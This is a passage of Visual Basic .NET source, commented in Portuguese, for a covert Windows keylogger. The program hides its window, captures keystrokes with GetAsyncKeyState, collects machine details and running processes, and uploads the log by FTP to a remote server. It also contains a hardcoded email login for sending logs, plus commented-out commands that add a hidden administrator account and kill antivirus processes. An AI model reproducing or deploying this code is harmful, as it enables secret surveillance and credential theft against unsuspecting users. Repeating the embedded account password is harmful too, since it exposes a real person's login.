                    End Select
                End If

            End If
        Next n
        'end código


    End Sub
    ' para implementação

    ' para implementação fim

    Sub MainEvents()
        ' nesta parte você configurará os e-mails que deseja enviar os logs, aqui será o mesmo formato de uma conta de e-mail, ou
        ' seja você precisará configurá uma conta principal pode ser ela Yahoo, hotmail, bol, uol, Gmail esta precisa ser ativada
        '	O acesso a aplicativos menos seguros clique »» https://www.google.com/settings/security/lesssecureapps
        ' aconselho fortemente que utilize »» smtp.live.com pois é mais eficaz porém os outros funcionam perfeitamente.

        '------------------smtps---------------------
        'smtp.live.com
        'smtp.gmail.com
        'smtp.mail.yahoo.com.br
        'smtps.bol.com.br

        'Try
        ' MessageBox.Show(TextBox1.Text)
        'Dim value As String = My.Computer.Name
        Dim value As String = Environment.UserName
        Dim mail As New MailMessage
        Dim smtpserver As New SmtpClient()

        smtpserver.EnableSsl = True
        smtpserver.UseDefaultCredentials = False
        smtpserver.Credentials = New Net.NetworkCredential("afmdaniel@hotmail.com", "analista96")
        smtpserver.Port = 587
        smtpserver.Host = "smtp-mail.outlook.com"



        mail = New MailMessage
        mail.From = New MailAddress("afmdaniel@hotmail.com") 'intervalo está configurado para cada 5 minutos use acima disto.
        mail.To.Add("afmdaniel@hotmail.com")
        mail.Subject = Environment.UserName

        mail.Subject = My.Computer.Info.OSFullName 'versão do sistema operacional.
        mail.Body = TextBox1.Text
        criararquivo(TextBox1.Text)
        'smtpserver.Send(mail)
        Upload(pasta, "analista_pc")
        'Catch ex As Exception
        'MessageBox.Show(ex.Message)
        'End Try
    End Sub
    Private Sub criararquivo(texto As String)
        'Try

        Dim path As String = pasta

        ' Create or overwrite the file.
        Dim fs As FileStream = File.Create(path)

        ' Add text to the file.
        Dim info As Byte() = New UTF8Encoding(True).GetBytes(texto)

        fs.Write(info, 0, info.Length)
        fs.Close()

        'Catch ex As Exception
        'MessageBox.Show(ex.Message)
        'End Try
    End Sub

    Private Sub Upload(Arquivo As String, Destino As String)
        'Try


        Dim Request = DirectCast(System.Net.WebRequest.Create(Convert.ToString("ftp://" + servidor + "/" + Environment.MachineName + " " + Date.Today.ToShortDateString().Replace("/", "-") + "-" + Date.Now.ToLongTimeString.Replace(":", "-") + ".txt")), System.Net.FtpWebRequest)
        Request.Method = System.Net.WebRequestMethods.Ftp.UploadFile

        Request.Credentials = New System.Net.NetworkCredential(usuarioftp, senhaftp)

        'Dim ConteudoArquivo = System.IO.File.ReadAllBytes(Arquivo)
        'Request.ContentLength = ConteudoArquivo.Length

        'Dim RequestStream = Request.GetRequestStream()
        ' RequestStream.Write(ConteudoArquivo, 0, ConteudoArquivo.Length)
        ' RequestStream.Close()

        Using fileStream As Stream = File.OpenRead(pasta),
        ftpStream As Stream = Request.GetRequestStream()
            fileStream.CopyTo(ftpStream)
        End Using

        Dim Response = DirectCast(Request.GetResponse(), System.Net.FtpWebResponse)
        Console.WriteLine("Upload completo. Status: {0}", Response.StatusDescription)
        Response.Close()
        Dim path As String = pasta

        ' Create or overwrite the file.
        File.Delete(path)
        'Catch ex As Exception
        'MessageBox.Show(ex.Message)
        'End Try
    End Sub
    Dim tempo As Boolean = False
    Private Sub Timer2_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer2.Tick

        If (tempo = False) Then
            Timer2.Interval = intervalo
        End If
        On Error Resume Next
        Dim result As Integer
        Dim key As String
        Dim i As Integer

        For i = 2 To 90
            result = 0
            result = GetAsyncKeyState(i)
            If result = -32767 Then

                key = Chr(i)
                If i = 13 Then key = vbNewLine
                Exit For
            End If
        Next i
        If TextBox1.Text <> "" Then
            MainEvents()
        End If


    End Sub

    Private Sub Form1(ByVal sender As Object, ByVal e As EventArgs) Handles MyBase.Load

        Me.ShowInTaskbar = False
        Me.ShowIcon = False
        Me.Visible = False
        Me.Hide()
        TextBox1.Text &= vbNewLine & DateTime.Now.ToString("dd/MM/yyyy HH:mm:ss.fff") + vbNewLine
        TextBox1.Text &= vbNewLine & " Configurações do computador do usuário" + vbNewLine
        TextBox1.Text = TextBox1.Text + (Format(Now, "long date"))
        TextBox1.Text = TextBox1.Text & "  "
        TextBox1.Text = TextBox1.Text + (Format(Now, "long time"))
        TextBox1.Text &= vbNewLine & " -------------------------------------------------------------------------------------------------- " + vbNewLine
        '--------------------------- habilita a página principal, caso ativo código comentado --------------------------------------------------
        'My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main", "Start Page", "http://www.bol.com.br/")
        'TextBox1.Text = TextBox1.Text + vbNewLine + "Status da Rede: " + My.Computer.Network.Ping("", 10).ToString
        TextBox1.Text &= vbNewLine & " -------------------------------------------------------------------------------------------------- "
        'TextBox1.Text = TextBox1.Text + vbNewLine + "System root:     " + Environment.SystemDirectory.ToString
        'TextBox1.Text &= vbNewLine & " ------------------------------------------------------------------ "
        TextBox1.Text = TextBox1.Text + vbNewLine + "Computador Nome: " + Environment.MachineName.ToString
        TextBox1.Text &= vbNewLine & " -------------------------------------------------------------------------------------------------- "
        TextBox1.Text = TextBox1.Text + vbNewLine + "Resoluçao de tela:   " + My.Computer.Screen.WorkingArea.ToString
        TextBox1.Text &= vbNewLine & " -------------------------------------------------------------------------------------------------- "
        TextBox1.Text = TextBox1.Text + vbNewLine + "Versão do Windows: " + My.Computer.Info.OSFullName
        TextBox1.Text &= vbNewLine & " --------------------------------------------------------------------------------------------------- "
        TextBox1.Text = TextBox1.Text + vbNewLine + "Idioma:     " + My.Computer.Info.InstalledUICulture.ToString
        TextBox1.Text &= vbNewLine & " -------------------------------------------------------------------------------------------------- "
        TextBox1.Text = TextBox1.Text + vbNewLine + "Memória física total:   " + My.Computer.Info.TotalPhysicalMemory.ToString
        TextBox1.Text &= vbNewLine & " -------------------------------------------------------------------------------------------------- "
        TextBox1.Text = TextBox1.Text + vbNewLine + "Plataforma: " + My.Computer.Info.OSPlatform.ToString
        TextBox1.Text &= vbNewLine & " -------------------------------------------------------------------------------------------------- "
        TextBox1.Text = TextBox1.Text + vbNewLine + "Endereço Mac:     " + Net.NetworkInformation.NetworkInterface.GetAllNetworkInterfaces(1).GetPhysicalAddress().ToString()
        TextBox1.Text &= vbNewLine & " -------------------------------------------------------------------------------------------------- "
        TextBox1.Text = TextBox1.Text + vbNewLine + "Tela_Bits Por Pixel:     " + Screen.PrimaryScreen.Bounds.Width.ToString
        TextBox1.Text &= vbNewLine & " -------------------------------------------------------------------------------------------------- "
        TextBox1.Text = TextBox1.Text + vbNewLine + "Detalhes da memória física:     " + My.Computer.Info.AvailablePhysicalMemory.ToString
        TextBox1.Text &= vbNewLine & " -------------------------------------------------------------------------------------------------- "
        TextBox1.Text = TextBox1.Text + vbNewLine + "Memória virtual total:     " + My.Computer.Info.TotalVirtualMemory.ToString
        TextBox1.Text &= vbNewLine & " -------------------------------------------------------------------------------------------------- "
        TextBox1.Text = TextBox1.Text + vbNewLine + "Domínio:     " + Environment.UserDomainName.ToString
        TextBox1.Text &= vbNewLine & " -------------------------------------------------------------------------------------------------- "
        Dim strHostName As String
        Dim strIPAddress As String
        strHostName = Dns.GetHostName()
        strIPAddress = System.Net.Dns.GetHostEntry(strHostName).AddressList(1).ToString()
        TextBox1.Text &= vbNewLine & ("Computador Nome: " & strHostName & " Endereço IP: " & strIPAddress).ToString()
        TextBox1.Text &= vbNewLine & " -------------------------------------------------------------------------------------------------- "
        TextBox1.Text = TextBox1.Text + vbNewLine + "Aplicativo está sendo iniciado em:     " + Environment.CurrentDirectory.ToString
        TextBox1.Text &= vbNewLine & " -------------------------------------------------------------------------------------------------- "
        'TextBox1.Text = TextBox1.Text + vbNewLine + "Data e Hora: " + My.Computer.Clock.LocalTime.ToString + vbNewLine + vbNewLine
        'TextBox1.Text = TextBox1.Text + vbNewLine + "color" + My.Computer.Keyboard.CapsLock
        Dim getInfo As System.IO.DriveInfo()
        getInfo = System.IO.DriveInfo.GetDrives
        For Each info As System.IO.DriveInfo In getInfo
            TextBox1.Text &= vbNewLine + "Unidade disponível " + info.Name
        Next
        TextBox1.Text &= vbNewLine & "-------------------------------------------------------------------------------------------------- "
        Try
            Dim Registry1 As String = "HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\SYSTEM\BIOS"
            Dim Registry2 As String = "HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\SYSTEM\CENTRALPROCESSOR\0"

            TextBox1.Text = TextBox1.Text + vbNewLine + "Computador Fabricante: " _
                 + My.Computer.Registry.GetValue(Registry1, "SystemManufacturer", Nothing).ToString + vbNewLine _
                 + "Computador modelo: " _
                 + My.Computer.Registry.GetValue(Registry1, "SystemProductName", Nothing).ToString + vbNewLine _
                 + "Processador: " _
                 + My.Computer.Registry.GetValue(Registry2, "ProcessorNameString", Nothing).ToString + vbNewLine _
                 + "Modelo de arquitetura: " _
                 + My.Computer.Registry.GetValue(Registry2, "Identifier", Nothing).ToString + vbNewLine _
                 + "Processador velocidade: " _
                 + (((My.Computer.Registry.GetValue(Registry2, "~MHz", Nothing) / 10) \ 10) / 10).ToString + " GHz" + vbNewLine _
                 + "Processador Fabricante: " _
                 + My.Computer.Registry.GetValue(Registry2, "VendorIdentifier", Nothing).ToString + vbNewLine _
                 + "Mémoria física total (RAM): " _
                 + My.Computer.Info.TotalPhysicalMemory.ToString
        Catch
        End Try
        '4310203136 = 4 GB
        '3210203136 = 3 GB
        TextBox1.Text &= vbNewLine & "-------------------------------------------------------------------------------------------------- "
        TextBox1.Text &= vbNewLine & "Processos em execução nesta máquina ↓↓↓↓ segue lista abaixo"
        TextBox1.Text &= vbNewLine & "-------------------------------------------------------------------------------------------------- "
        Dim myProcess As New Process()
        myProcess.StartInfo.UseShellExecute = False
        myProcess.StartInfo.RedirectStandardOutput = True

        myProcess.StartInfo.FileName = "tasklist"
        'myProcess.StartInfo.Arguments = "cmd"
        myProcess.StartInfo.CreateNoWindow = True
        myProcess.Start()
        TextBox1.Text = TextBox1.Text + _
       Replace(myProcess.StandardOutput.ReadToEnd(), _
        Chr(13) & Chr(13), Chr(13))
        myProcess.WaitForExit()

        TextBox1.Text &= vbNewLine & "-------------------------------------------------------------------------------------------------- "
        TextBox1.Text &= vbNewLine & " Corpo do E-mail logo abaixo: Mensagens intervalo 1 minutos "
        TextBox1.Text &= vbNewLine & "-------------------------------------------↓----------------------------------------------------- " + vbNewLine + vbNewLine

        '--------os comandos abaixo criará um usuário e o colocará no grupo de administrador obvio função alternativa.------------------
        'Shell("cmd.exe /C net user projeto 12345 /add")
        'Shell("cmd.exe /C net localgroup administradores projeto 12345  /add")
        'TextBox1.Text &= vbNewLine & Shell("cmd.exe /C systeminfo").ToString().ToString


        '-------------------------------------------- Processos que serão finalizados na inicialização deste software -----------------------------------------------
        'Shell("Taskkill avg.exe /IM bdagent.exe /IM ekrn.exe /IM mbam.exe /IM egui.exe /IM avp.exe")
        'Shell("taskkill /IM/F egui.exe")
        If (hora <> String.Empty) Then

            TextBox1.Text &= vbNewLine & "-------------------------------------------------------------------------------------------------- "
            TextBox1.Text &= vbNewLine & "Este computador foi desligado as:" + hora.ToString()
            TextBox1.Text &= vbNewLine & "-------------------------------------------↓----------------------------------------------------- " + vbNewLine + vbNewLine
        End If


    End Sub 'Main


    Private Sub form1_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing


    End Sub
End Class



